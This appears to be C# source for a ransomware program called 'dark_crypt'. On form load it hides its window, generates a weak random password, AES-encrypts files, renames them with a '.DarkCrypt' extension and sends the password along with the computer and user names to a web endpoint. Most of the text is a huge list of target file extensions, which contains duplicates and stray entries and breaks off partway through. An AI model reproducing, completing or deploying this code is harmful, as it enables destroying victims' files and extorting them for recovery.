using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;


namespace dark_crypt
{
    public partial class Form1 : Form
    {
        //Url to send encryption password and computer info
        string targetURL = "https://127.0.0.1:8080/dark-crypt/write.php?info=";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\";
        string backgroundImageUrl = "https://i.ibb.co/wscjD8p/Dark.jpg";



        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //starts encryption at form load
            startAction();

        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //creates random password for encryption
        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--){
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        //Sends created password target location
        public void SendPassword(string password){
            
            string info = computerName + "-" + userName + " " + password;
            var fullUrl = targetURL + info;
            var conent = new System.Net.WebClient().DownloadString(fullUrl);
        }

        //Encrypts single file
        public void EncryptFile(string file, string password)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file+".DarkCrypt");

            
            

        }

        //encrypts target directory
        public void encryptDirectory(string location, string password)
        {
            
            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".!bt", ".!qb", ".!ut", ".#24", ".#ib", ".#sc", ".#st", ".$#!", ".$$$", ".$00", ".$01", ".$db", ".$ed", ".$er", ".$o1", ".$vm", ".^^^", ".__a", ".__b", "._dd", "._eml", "._nws", "._p", ".~$~", ".~ap", ".~de", ".~hm", ".~mn", ".{pb", ".\201$\201", ".000", ".001", ".075", ".085", ".091", ".096", ".0b", ".0xe", ".1", ".10", ".113", ".123", ".15u", ".1pe", ".1ph", ".1st", ".2", ".264", ".2d", ".2da", ".2dl", ".3d", ".3dl", ".3dv", ".301", ".386", ".3da", ".3dd", ".3dr", ".3ds", ".3dt", ".3fx", ".3g2", ".3gp", ".3gr", ".3ko", ".3me", ".3mm", ".3pe", ".3t4", ".411", ".4c$", ".4dv", ".4mp", ".4sw", ".4th", ".5cr", ".669", ".6cm", ".777", ".7z", ".8", ".8b?", ".8ba", ".8bf", ".8bi", ".8cm", ".8li", ".8m", ".8pbs", ".8u", ".a", ".a0?", ".a11", ".a2b", ".a3d", ".a3m", ".a3w", ".a4a", ".a4m", ".a4p", ".a4w", ".a5w", ".aa", ".aab", ".aac", ".aam", ".aax", ".ab2", ".ab6", ".ab8", ".aba", ".abc", ".abd", ".abf", ".abi", ".abk", ".abm", ".abr", ".abs", ".abw", ".abx", ".aby", ".ac3", ".aca", ".acb", ".acc", ".acd", ".ace", ".acf", ".aci", ".acl", ".acm", ".acorn", ".acs", ".acs2", ".acsm", ".act", ".acv", ".ad", ".ada", ".adb", ".adc", ".ade", ".adf", ".adi", ".adl", ".adm", ".adn", ".ado", ".adp", ".adr", ".ads", ".adt", ".adx", ".adz", ".aeh", ".aep", ".aex", ".af2", ".aff", ".afi", ".afl", ".afm", ".afs", ".aft", ".ag", ".agp", ".agw", ".ai", ".aiff", ".ain", ".aio", ".air", ".ais", ".aix", ".ajp", ".alb", ".albm", ".all", ".als", ".alt", ".alx", ".alz", ".amf", ".amff", ".amg", ".amp", ".amr", ".amv", ".amx", ".anc", ".ani", ".anm", ".ann", ".ans", ".aos", ".ap", ".apc", ".apd", ".ape", ".apf", ".api", ".apk", ".apl", ".apm", ".app", ".apr", ".aps", ".apx", ".arc", ".arf", ".arg", ".ari", ".arj", ".arl", ".ark", ".arr", ".ars", ".art", ".arv", ".arx", ".asa", ".asc", ".ascx", ".asd", ".asf", ".ash", ".asi", ".asl", ".asm", ".asmx", ".aso", ".asp", ".aspx", ".asr", ".asx", ".asx", ".at2", ".atm", ".atn", ".atr", ".att", ".aty", ".au", ".au3", ".aud", ".aut", ".aux", ".ava", ".avb", ".avd", ".avi", ".avr", ".avs", ".avx", ".aw", ".awb", ".awd", ".awe", ".awk", ".awm", ".awp", ".awr", ".aws", ".ax", ".axd", ".axe", ".axg", ".axl", ".axs", ".axt", ".axx", ".azw", ".azz", ".b", ".b&w", ".b~k", ".b00", ".b16", ".b1n", ".b1s", ".b30", ".b3d", ".b5i", ".b5t", ".b6i", ".b6t", ".b8", ".b_w", ".bad", ".bag", ".backup", ".bak", ".bal", ".ban", ".bar", ".bas", ".bat", ".bb", ".bba", ".bbl", ".bbm", ".bbs", ".bc!", ".bcf", ".bch", ".bck", ".bcm", ".bcn", ".bco", ".bcp", ".bct", ".bcw", ".bde", ".bdf", ".bdm", ".bdmv", ".bdr", ".bez", ".bf2", ".bff", ".bfm", ".bfs", ".bfx", ".bga", ".bgt", ".bgi", ".bgl", ".bgt", ".bib", ".bic", ".bid", ".bif", ".bik", ".bin", ".bio", ".bip", ".bit", ".bk", ".bk!", ".bk1", ".bk2", ".bk3", ".bk4", ".bk5", ".bk6", ".bk7", ".bk8", ".bk9", ".bkf", ".bkg", ".bkp", ".bkw", ".blb", ".bld", ".blend", ".blf", ".blg", ".blk", ".blob", ".blt", ".bm", ".bmf", ".bmi", ".bmk", ".bmp", ".bmx", ".bnd", ".bndl", ".bnk", ".bob", ".bom", ".boo", ".book", ".bot", ".box", ".bpc", ".bpl", ".bpt", ".bqy", ".br", ".brd", ".brf", ".brk", ".brn", ".bro", ".brp", ".brt", ".brx", ".bsa", ".bsb", ".bsc", ".bsdl", ".bsl", ".bsp", ".bst", ".bsv", ".bt!", ".btm", ".btn", ".bto", ".btr", ".btx", ".bud", ".bug", ".bun", ".bup", ".but", ".buy", ".bv1", ".bv2", ".bv3", ".bv4", ".bv5", ".bv6", ".bv7", ".bv8", ".bv9", ".bwa", ".bwb", ".bwi", ".bwr", ".bws", ".bwt", ".bxx", ".bz2", ".c", ".c++", ".c--", ".c00", ".c01", ".c2d", ".c4d", ".c60", ".c86", ".ca", ".cab", ".cache", ".cad", ".cac", ".cad", ".cag", ".cal", ".calb", ".cam", ".can", ".cap", ".car", ".cas", ".cat", ".cb", ".cbc", ".cbf", ".cbl", ".cbm", ".cbp", ".cbr", ".cbt", ".cbz", ".cc", ".cca", ".ccb", ".ccc", ".ccd", ".cce", ".ccf", ".cch", ".ccl", ".cco", ".cct", ".ccx", ".cda", ".cdb", ".cdd", ".cde", ".cdf", ".cdg", ".cdi", ".cdk", ".cdl", ".cdm", ".cdp", ".cdr", ".cdt", ".cdx", ".ce", ".ceb", ".ceg", ".cel", ".cf", ".cfb", ".cfc", ".cfg", ".cfl", ".cfm", ".cfn", ".cfo", ".cfp", ".cfr", ".cga", ".cgd", ".cge", ".cgi", ".cgm", ".ch", ".ch3", ".ch4", ".chd", ".chi", ".chk", ".chl", ".chm", ".chn", ".cho", ".chp", ".chr", ".cht", ".chw", ".cid", ".cif", ".ciff", ".cil", ".cit", ".cix", ".ckb", ".cl", ".cl3", ".cl4", ".cl5", ".class", ".clb", ".clg", ".cli", ".clm", ".clp", ".clpi", ".clr", ".cls", ".cm", ".cmd", ".cmf", ".cmg", ".cmk", ".cml", ".cmm", ".cmo", ".cmp", ".cmq", ".cmt", ".cms", ".cmv", ".cmx", ".cnc", ".cnd", ".cnf", ".cnt", ".cnv", ".cob", ".cod", ".col", ".com", ".con", ".conf", ".config", ".cor", ".cpd", ".cpe", ".cpf", ".cph", ".cpi", ".cpl", ".cpo", ".cpp", ".cpr", ".cps", ".cpt", ".cpx", ".cpy", ".cpz", ".cr2", ".crd", ".crf", ".crh", ".crp", ".crs", ".crt", ".crtr", ".crtx", ".cru", ".crw", ".crx", ".crz", ".cs", ".csa", ".csf", ".csg", ".csh", ".csk", ".csm", ".cso", ".csp", ".css", ".cst", ".csv", ".ct", ".ctc", ".ctd", ".ctf", ".ctg", ".ctl", ".ctn", ".ctt", ".ctu", ".ctx", ".cty", ".cue", ".cuf", ".cul", ".cur", ".cut", ".cv4", ".cv5", ".cva", ".cvb", ".cvd", ".cvp", ".cvr", ".cvs", ".cvt", ".cvw", ".cwk", ".cwz", ".cxf", ".cxp", ".cxt", ".cxx", ".d", ".d00", ".d10", ".d2s", ".d3d", ".d64", ".dat", ".data", ".day", ".db", ".db$", ".db2", ".db3", ".dba", ".dbb", ".dbd", ".dbf", ".dbg", ".dbk", ".dbl", ".dbm", ".dbo", ".dbs", ".dbt", ".dbw", ".dbx", ".dca", ".dcf", ".dcm", ".dcp", ".dcr", ".dcs", ".dct", ".dcx", ".dd", ".ddat", ".ddb", ".ddc", ".ddf", ".ddi", ".ddp", ".de", ".de7", ".deb", ".dec", ".def", ".dem", ".des", ".dev", ".dfd", ".dff", ".dfi", ".dfl", ".dfm", ".dfs", ".dft", ".dfv", ".dfx", ".dgn", ".dgr", ".dgs", ".dh", ".dhp", ".dht", ".dhy", ".dia", ".dib", ".dic", ".dif", ".dig", ".dip", ".dir", ".dis", ".divx", ".diz", ".dje", ".djv", ".djvu", ".dkb", ".dl", ".dl_", ".dld", ".dlg", ".dll", ".dls", ".dmf", ".dmg", ".dml", ".dmo", ".dmp", ".dms", ".dmsk", ".dna", ".dnasym", ".dnax", ".dne", ".dng", ".dnl", ".do", ".doc", ".docm", ".docx", ".dog", ".doh", ".dol", ".dos", ".dot", ".dotx", ".dox", ".doz", ".dp", ".dpg", ".dpk", ".dpp", ".dpr", ".dps", ".dpt", ".dpx", ".dra", ".drs", ".drv", ".drw", ".ds", ".ds4", ".dsa", ".dsb", ".dsc", ".dsd", ".dsf", ".dsk", ".dsm", ".dsn", ".dsp", ".dsp2", ".dsr", ".dss", ".dst", ".dsw", ".dsy", ".dt_", ".dta", ".dtd", ".dtf", ".dtp", ".dup", ".dus", ".dvc", ".dvf", ".dvi", ".dvp", ".dvr", ".dvr-ms", ".dw2", ".dwc", ".dwd", ".dwf", ".dwg", ".dwk", ".dwl", ".dwt", ".dwz", ".dx", ".dxf", ".dxn", ".dxr", ".dyc", ".dylib", ".dyn", ".dz", ".e3p", ".e3s", ".e3t", ".e3v", ".eap", ".ear", ".eas", ".ebj", ".ebo", ".ebp", ".ecf", ".eco", ".ecw", ".edb", ".edl", ".edr", ".eds", ".edt", ".eeb", ".efe", ".eft", ".efx", ".ega", ".ek5", ".ek6", ".ekm", ".el", ".elc", ".elm", ".elt", ".email", ".emb", ".emd", ".emf", ".eml", ".emp", ".ems", ".emu", ".emx", ".emz", ".enc", ".end", ".eng", ".ens", ".env", ".eot", ".epd", ".epf", ".epi", ".epp", ".eps", ".epub", ".eqn", ".erd", ".erm", ".err", ".esp", ".esh", ".esl", ".ess", ".est", ".etf", ".eth", ".ets", ".etx", ".ev", ".evi", ".evl", ".evr", ".evt", ".evy", ".ewd", ".ewl", ".ex", ".ex_", ".ex3", ".exc", ".exd", ".exe", ".exm", ".exp", ".ext", ".ext2fs", ".exx", ".ezf", ".ezm", ".ezp", ".ezz", ".f", ".f_i", ".f01", ".f06", ".f07", ".f08", ".f09", ".f10", ".f11", ".f12", ".f13", ".f14", ".f16", ".f2", ".f2r", ".f3r", ".f4v", ".f77", ".f90", ".f96", ".fac", ".faq", ".far", ".fav", ".fax", ".fbc", ".fbk", ".fc", ".fcd", ".fcm", ".fcp", ".fcs", ".fcw", ".fd", ".fdb", ".fde", ".fdf", ".fdr", ".fdw", ".feb", ".fef", ".fes", ".fev", ".ff", ".ffa", ".fff", ".ffl", ".ffo", ".fft", ".ffx", ".fgd", ".fh3", ".fh4", ".fh5", ".fh6", ".fh7", ".fh8", ".fh9", ".fh10", ".fi", ".fif", ".fig", ".fil", ".fin", ".fio", ".fit", ".fix", ".fky", ".fla", ".flac", ".flb", ".flc", ".fld", ".fle", ".flf", ".fli", ".flk", ".flm", ".flo", ".flp", ".flt", ".flv", ".flx", ".fm", ".fm1", ".fm3", ".fmb", ".fmf", ".fmg", ".fmk", ".fmo", ".fmp", ".fmpp", ".fmt", ".fmv", ".fmz", ".fn3", ".fnt", ".fnx", ".fo1", ".fo2", ".fol", ".fon", ".for", ".fot", ".fp", ".fp3", ".fp4", ".fp5", ".fpb", ".fpc", ".fpk", ".fpr", ".fpt", ".fpw", ".fpx", ".fqy", ".fr3", ".frc", ".frd", ".fre", ".frf", ".frg", ".frl", ".frm", ".fro", ".frp", ".frs", ".frt", ".frx", ".fs", ".fsc", ".fsh", ".fsl", ".fsm", ".fst", ".fsproj", ".fsx", ".fsy", ".ftm", ".fts", ".ftw", ".ftp", ".fus", ".fvt", ".fw", ".fw2", ".fw3", ".fwp", ".fx", ".fxd", ".fxm", ".fxo", ".fxp", ".fxr", ".fxs", ".g", ".g3", ".g3f", ".g3n", ".g8", ".gab", ".gal", ".gam", ".gat", ".gb", ".gba", ".gbc", ".gbd", ".gbl", ".gbr", ".gbx", ".gc1", ".gc3", ".gcd", ".gcf", ".gdb", ".gdf", ".gdr", ".ged", ".gem", ".gen", ".geo", ".gfb", ".gft", ".gfx", ".gg", ".gho", ".ghs", ".gib", ".gid", ".gif", ".gig", ".giw", ".gl", ".glm", ".gls", ".gly", ".gmd", ".gmf", ".gml", ".gmp", ".gno", ".gnt", ".goc", ".goh", ".gp", ".gp3", ".gp4", ".gpd", ".gph", ".gpk", ".gpx", ".gr2", ".gra", ".grb", ".grd", ".grf", ".grl", ".grp", ".grx", ".gry", ".gs1", ".gsd", ".gsm", ".gsp", ".gsw", ".gtp", ".gts", ".gup", ".gwi", ".gwp", ".gxd", ".gxl", ".gxt", ".gym", ".gz", ".gzip", ".h", ".h!", ".h++", ".h--", ".ha", ".ham", ".hap", ".hbk", ".hbs", ".hcr", ".hdf", ".hdl", ".hdp", ".hdr", ".hds", ".hdw", ".hdx", ".hed", ".hex", ".hfi", ".hfx", ".hgl", ".hh", ".hhc", ".hhh", ".hhk", ".hhp", ".hht", ".hin", ".his", ".hlb", ".hlp", ".hlz", ".hm3", ".hmm", ".hnc", ".hof", ".hp8", ".hpf", ".hpg", ".hpi", ".hpj", ".hpk", ".hpm", ".hpp", ".hqx", ".hrf", ".hrm", ".hs2", ".hsi", ".hst", ".hta", ".htc", ".htf", ".hti", ".htm", ".html", ".htr", ".htt", ".htx", ".hus", ".hwd", ".hxm", ".hxx", ".hy1", ".hy2", ".hyc", ".hyd", ".hyp", ".hyt", ".i", ".iaf", ".iax", ".ibm", ".ibd", ".ibp", ".ibq", ".ica", ".icb", ".icc", ".icd", ".icl", ".icm", ".icn", ".ico", ".ics", ".id", ".id2", ".idb", ".ide", ".idf", ".idl", ".idw", ".idx", ".ies", ".ifd", ".iff", ".ifo", ".ifp", ".ifs", ".igr", ".igs", ".igx", ".iif", ".ilb", ".ilk", ".im30", ".im8", ".ima", ".imb", ".imc", ".imd", ".imf", ".img", ".imm", ".imn", ".imp", ".imq", ".ims", ".imv", ".imw", ".imz", ".in$", ".in3", ".inb", ".inc", ".ind", ".indd", ".inf", ".ini", ".ink", ".inl", ".inp", ".ins", ".int", ".inv", ".inx", ".io", ".iob", ".ioc", ".ion", ".ipa", ".ipd", ".ipg", ".ipj", ".ipl", ".ipp", ".ips", ".ipsw", ".ipx", ".ipz", ".iri", ".irs", ".isd", ".ish", ".isk", ".iso", ".isr", ".iss", ".ist", ".isu", ".isz", ".it", ".itc2", ".itdb", ".itf", ".ith", ".itl", ".iv", ".iva", ".ivt", ".iw", ".iwa", ".iwd", ".iwp", ".izt", ".j01", ".jad", ".jar", ".jas", ".jav", ".java", ".jbc", ".jbd", ".jbf", ".jbk", ".jbr", ".jbx", ".jdt", ".jef", ".jet", ".jff", ".jfif", ".jfx", ".jhtml", ".jif", ".jmx", ".jnb", ".jnl", ".jnlp", ".jnt", ".job", ".jor", ".jou", ".jp2", ".jpc", ".jpeg", ".jpf", ".jpg", ".jps", ".jpx", ".js", ".jsd", ".jse", ".jsf", ".jsh", ".json", ".jsp", ".jtf", ".jtp", ".jup", ".jw", ".jwl", ".jwp", ".jxr", ".jzz", ".kar", ".kau", ".kb", ".kbd", ".kbm", ".kcl", ".kcp", ".kdc", ".keo", ".ket", ".kex", ".kext", ".key", ".kgb", ".kit", ".kix", ".kma", ".kml", ".kmp", ".kmx", ".kmz", ".kos", ".kp2", ".kpl", ".kpp", ".kps", ".kqb", ".kqe", ".kqp", ".krz", ".ksd", ".ktk", ".kwi", ".kwm", ".kyb", ".l", ".l01", ".lab", ".lang", ".lat", ".latex", ".lay", ".lbg", ".lbl", ".lbm", ".lbo", ".lbr", ".lbt", ".lbx", ".lcf", ".lck", ".lcl", ".lcn", ".lcs", ".lcw", ".ld", ".ld1", ".ldb", ".ldf", ".ldif", ".leg", ".les", ".let", ".lev", ".lex", ".lfa", ".lft", ".lg", ".lgc", ".lgo", ".lgx", ".lha", ".lhw", ".lib", ".lic", ".lid", ".lif", ".lim", ".lin", ".lis", ".lit", ".lix", ".lj", ".lko", ".ll3", ".lmp", ".lmt", ".lnd", ".lng", ".lnk", ".loc", ".lod", ".log", ".lok", ".lpc", ".lpd", ".lpf", ".lpi", ".lpk", ".lrf", ".lrs", ".lse", ".lsf", ".lsl", ".lsp", ".lss", ".lst", ".lt2", ".ltm", ".ltr", ".lua", ".lvl", ".lvp", ".lwa", ".lwd", ".lwo", ".lwp", ".lwz", ".lx", ".lyr", ".lzd", ".lzh", ".lzs", ".lzw", ".lzx", ".m", ".m11", ".m1v", ".m2p", ".m2ts", ".m2v", ".m3", ".m3d", ".m3u", ".m4", ".m4a", ".m4b", ".m4p", ".m4r", ".m4v", ".m_u", ".ma3", ".mac", ".mad", ".maff", ".mag", ".mai", ".mak", ".man", ".map", ".mar", ".mas", ".mat", ".max", ".mb", ".mbf", ".mbk", ".mbx", ".mcc", ".mcd", ".mcf", ".mci", ".mcp", ".mcr", ".mcw", ".mcx", ".md", ".md5", ".mda", ".mdb", ".mde", ".mdf", ".mdi", ".mdk", ".mdl", ".mdm", ".mdmp", ".mdr", ".mdt", ".mdx", ".mdz", ".me", ".meb", ".med", ".mem", ".meq", ".mer", ".mes", ".met", ".meu", ".mex", ".mf", ".mfx", ".mgf", ".mgi", ".mgp", ".mhp", ".mht", ".mia", ".mib", ".mic", ".mid", ".mif", ".mil", ".mim", ".mio", ".mip", ".mis", ".mix", ".mk", ".mkd", ".mke", ".mki", ".mks", ".ml3", ".mlb", ".mlm", ".mm", ".mmc", ".mmd", ".mmf", ".mml", ".mmm", ".mmo", ".mmp", ".mmx", ".mmz", ".mnd", ".mng", ".mnt", ".mnu", ".mnx", ".mny", ".mob", ".mod", ".mol", ".mon", ".mov", ".mp2", ".mp3", ".mp4", ".mpa", ".mpc", ".mpd", ".mpe", ".mpeg", ".mpf", ".mpg", ".mpl", ".mpls", ".mpm", ".mpp", ".mpq", ".mpr", ".mps", ".mpt", ".mpv", ".mpw", ".mpx", ".mrb", ".mrc", ".mrk", ".mrs", ".msc", ".msd", ".msf", ".msg", ".msi", ".msm", ".msn", ".mso", ".msp", ".mspx", ".mss", ".Jove)", ".mst", ".msu", ".msv", ".msw", ".mswmm", ".msx", ".mtd", ".mth", ".mtm", ".mts", ".mtv", ".mtw", ".mtx", ".mu", ".muf", ".mul", ".mus", ".mvb", ".mvc", ".mvd", ".mvf", ".mvi", ".mvw", ".mwf", ".mwp", ".mws", ".mwv", ".mxd", ".mxe", ".mxf", ".mxl", ".mxm", ".mxp", ".mxt", ".myp", ".myr", ".mys", ".myt", ".mzp", ".na2", ".nam", ".nap", ".nav", ".nb", ".nbf", ".nbu", ".nc", ".ncb", ".ncc", ".ncd", ".ncf", ".nch", ".nd5", ".ndb", ".nde", ".ndf", ".ndk", ".ndx", ".neb", ".ned", ".nef", ".neo", ".nes", ".net", ".new", ".nfo", ".ng", ".ngf", ".ngg", ".nh", ".nib", ".nif", ".njb", ".nlm", ".nls", ".nlx", ".nmd", ".nmi", ".nmo", ".nms", ".nnb", ".nob", ".nol", ".not", ".now", ".np", ".npa", ".npf", ".npi", ".nra", ".nrb", ".nrg", ".nri", ".nrl", ".nrw", ".nsc", ".nsf", ".nsi", ".nst", ".nt", ".ntf", ".nth", ".ntp", ".ntr", ".nts", ".ntx", ".ntz", ".nu4", ".nuf", ".numbers", ".nup", ".nvc", ".nvm", ".nwc", ".nws", ".nwr", ".nwt", ".nxt", ".nzb", ".o", ".o$$", ".oaz", ".ob", ".obd", ".obj", ".obr", ".obs", ".obv", ".oca", ".ocf", ".ocm", ".ocp", ".ocr", ".oct", ".ocx", ".odf", ".odg", ".odl", ".odp", ".ods", ".odt", ".oeb", ".oem", ".ofc", ".ofd", ".off", ".ofm", ".oft", ".ofx", ".ogg", ".ogm", ".ogv", ".okt", ".olb", ".old", ".ole", ".oli", ".oma", ".omf", ".omg", ".oms", ".ond", ".one", ".ont", ".oom", ".opd", ".opf", ".opl", ".opn", ".ops", ".opt", ".opw", ".opx", ".or2", ".or3", ".or4", ".or5", ".ora", ".org", ".osd", ".oss", ".ost", ".otf", ".otl", ".otx", ".out", ".ov1", ".ov2", ".ovd", ".ovl", ".ovr", ".ovw", ".ows", ".oxt", ".p", ".p16", ".p22", ".p65", ".p7m", ".pa", ".pa1", ".pab", ".pac", ".pack", ".pad", ".paf", ".pages", ".pak", ".pal", ".pan", ".par", ".pas", ".pat", ".pax", ".pb", ".pb1", ".pba", ".pbd", ".pbf", ".pbi", ".pbk", ".pbl", ".pbm", ".pbo", ".pbr", ".pbt", ".pc", ".pc3", ".pc8", ".pca", ".pcb", ".pcc", ".pcd", ".pcf", ".pch", ".pcj", ".pck", ".pcl", ".pcm", ".pcs", ".pct", ".pcw", ".pcx", ".pd", ".pda", ".pdb", ".pdc", ".pdd", ".pde", ".pdf", ".pdg", ".pdl", ".pdr", ".pds", ".pdt", ".pdv", ".pdw", ".pdx", ".pe4", ".pea", ".peb", ".ped", ".pem", ".peq", ".per", ".pes", ".pet", ".pf", ".pfa", ".pfb", ".pfc", ".pfg", ".pfk", ".pfl", ".pfm", ".pfs", ".pft", ".pg", ".pgi", ".pgm", ".pgp", ".pgs", ".ph", ".phb", ".phn", ".php", ".pho", ".phr", ".phtml", ".pic", ".pif", ".pim", ".pip", ".pit", ".pix", ".pj64", ".pj", ".pjt", ".pjx", ".pk", ".pk3", ".pka", ".pkd", ".pkg", ".pkk", ".pkt", ".pl", ".pl1", ".pl3", ".plb", ".plc", ".pll", ".pln", ".plr", ".pls", ".plt", ".pmv", ".pmx", ".pn3", ".pnf", ".png", ".pnm", ".pnt", ".pod", ".poh", ".poi", ".pop", ".pos", ".pot", ".potx", ".pov", ".pow", ".pp", ".ppa", ".ppb", ".ppd", ".ppf", ".ppg", ".ppl", ".ppm", ".ppo", ".ppp", ".pps", ".ppsx", ".ppt", ".ppz", ".pqa", ".pqi", ".pr2", ".pr2", ".pr3", ".prc", ".prd", ".pre", ".prf", ".prg", ".pri", ".prj", ".prm", ".prn", ".pro", ".prs", ".prt", ".prx", ".prz", ".ps", ".ps2", ".psb", ".psd", ".pse", ".psf", ".psi", ".psm", ".psmdoc", ".psp", ".psr", ".pst", ".psw", ".pt3", ".pt4", ".ptb", ".ptm", ".ptn", ".ptp", ".ptr", ".pts", ".ptx", ".pub", ".put", ".puz", ".pva", ".pvd", ".pvm", ".pvl", ".pvt", ".pw", ".pwd", ".pwf", ".pwi", ".pwl", ".pwm", ".pwp", ".pwz", ".px", ".pxl", ".pxv", ".py", ".pyc", ".pyd", ".pyw", ".pz2", ".pz3", ".pza", ".pzd", ".pzl", ".pzo", ".pzp", ".pzs", ".pzt", ".pzx", ".q05", ".q9q", ".qad", ".qag", ".qap", ".qbb", ".qbe", ".qbk", ".qbl", ".qbo", ".qbr", ".qbw", ".qcn", ".qcp", ".qd0", ".qd1", ".qd2", ".qd3", ".qd4", ".qd5", ".qd6", ".qd7", ".qd8", ".qd9", ".qdat", ".qdb", ".qdf", ".qdt", ".qdv", ".qe4", ".qef", ".qel", ".qfl", ".qfx", ".qhf", ".qic", ".qif", ".qix", ".qlb", ".qlc", ".qlf", ".qlp", ".qm4", ".qm", ".qml", ".qph", ".qpr", ".qpw", ".qpx", ".qrp", ".qrs", ".qrt", ".qru", ".qry", ".qsd", ".qsi", ".qst", ".qt", ".qtc", ".qtk", ".qtl", ".qtp", ".qts", ".qtx", ".que", ".qvm", ".qvs", ".qw", ".qwk", ".qxd", ".qxl", ".qxp", ".qxt", ".r", ".r33", ".r8", ".r8p", ".ra", ".ram", ".rar", ".ras", ".rat", ".raw", ".rb", ".rbf", ".rbn", ".rbs", ".rbx", ".rc", ".rcf", ".rcg", ".rcp", ".rcx", ".rdb", ".rdf", ".rdi", ".rds", ".rdx", ".rec", ".red", ".ref", ".reg", ".rels", ".rem", ".rep", ".req", ".res", ".rev", ".rex", ".rex", ".rez", ".rf", ".rfl", ".rft", ".rgb", ".rgi", ".rgp", ".rgs", ".rgx", ".rh", ".rhp", ".ri", ".rib", ".ric", ".rif", ".rip", ".rix", ".rl4", ".rl8", ".rla", ".rlb", ".rlc", ".rle", ".rlz", ".rm", ".rmf", ".rmi", ".rmj", ".rmk", ".rmm", ".rmr", ".rms", ".rmvb", ".rm", ".rmvb", ".rmx", ".rn", ".rnd", ".roi", ".rno", ".rol", ".rpd", ".rpl", ".rpm", ".rps", ".rpt", ".rrd", ".rs", ".rs_", ".rsb", ".rsc", ".rsm", ".rsp", ".rss", ".rst", ".rsw", ".rtc", ".rtf", ".rtl", ".rtp", ".rts", ".rtx", ".ru", ".rul", ".run", ".rv", ".rvb", ".rvp", ".rvw", ".rwg", ".rws", ".rwx", ".rwz", ".rzk", ".rzr", ".rzx", ".s", ".s$$", ".s3m", ".sac", ".saf", ".sah", ".sal", ".sam", ".sar", ".sas", ".sas7bcat", ".sas7bdat", ".sas7bndx", ".sas7bpgm", ".sas7bvew", ".sas7mdb", ".sat", ".sav", ".sb", ".sbc", ".sbd", ".sbi", ".sbj", ".sbn", ".sbp", ".sbr", ".sbs", ".sbt", ".sbx", ".sc", ".sc3", ".sca", ".scc", ".scd", ".scf", ".sch", ".sci", ".scm", ".scn", ".sco", ".scp", ".scr", ".sct", ".scx", ".scy", ".sda", ".sdc", ".sdd", ".sdf", ".sdi", ".sdn", ".sdr", ".sds", ".sdt", ".sdu", ".sdw", ".sea", ".sec", ".sed", ".sep", ".seq", ".ses", ".set", ".sf", ".sf2", ".sfb", ".sfc", ".sff", ".sfi", ".sfl", ".sfn", ".sfo", ".sfp", ".sfs", ".sft", ".sfv", ".sfw", ".sfx", ".sg1", ".sgf", ".sgi", ".sgm", ".sgn", ".sgp", ".sgt", ".sh", ".sh3", ".sha", ".shb", ".shd", ".shg", ".shk", ".shm", ".shn", ".shp", ".shr", ".shs", ".shtml", ".shw", ".shx", ".sid", ".sif", ".sig", ".sik", ".sim", ".sis", ".sit", ".sitx", ".skb", ".skf", ".skin", ".skm", ".skn", ".skp", ".sl", ".slb", ".slc", ".sld", ".slf", ".sli", ".slk", ".sll", ".sln", ".slt", ".sm", ".smc", ".smd", ".smf", ".smi", ".smil", ".smk", ".smm", ".smp", ".sms", ".smt", ".smtmp", ".snd", ".sng", ".snm", ".sno", ".snp", ".snx", ".so", ".sol", ".som", ".son", ".sou", ".sp", ".spa", ".spc", ".spd", ".spf", ".spg", ".spi", ".spi", ".spl", ".spm", ".spo", ".spp", ".spr", ".sps", ".spt", ".spv", ".spw", ".spx", ".sql", ".sqlite", ".sqm", ".sqz", ".src", ".srf", ".srp", ".srt", ".ss", ".ssa", ".ssb", ".ssd", ".ssf", ".ssm", ".ssp", ".st", ".st3", ".sta", ".stb", ".std", ".stf", ".stg", ".stl", ".stm", ".stn", ".sto", ".stp", ".str", ".sts", ".stt", ".stu", ".stw", ".stx", ".sty", ".sub", ".sui", ".sum", ".sun", ".sup", ".sv4", ".svd", ".svg", ".svgz", ".svp", ".svs", ".sw", ".swd", ".swf", ".swg", ".swi", ".swk", ".swp", ".sxc", ".sxw", ".sy1", ".sy3", ".syd", ".sym", ".syn", ".sys", ".syw", ".szc", ".t", ".t$m", ".t04", ".t05", ".t06", ".t07", ".t08", ".t09", ".t10", ".t11", ".t12", ".t2", ".t44", ".t64", ".ta0", ".tab", ".tag", ".tah", ".tal", ".tao", ".tar", ".tax", 